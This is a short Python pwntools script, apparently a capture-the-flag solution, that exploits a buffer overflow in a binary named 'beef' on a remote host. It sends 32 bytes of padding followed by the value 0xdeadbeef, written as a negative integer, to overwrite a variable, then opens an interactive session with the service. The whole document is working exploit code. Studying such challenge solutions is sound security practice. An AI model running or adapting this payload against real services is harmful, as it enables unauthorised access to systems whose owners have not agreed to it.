from pwn import *

exe = './beef'
host, port = '139.144.184.150', 31337
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

# io = process(exe)
io = remote(host, port)

offset = b'A'*32

payload = flat([
    offset,
    -0x21524111
])

io.sendline(payload)
io.interactive()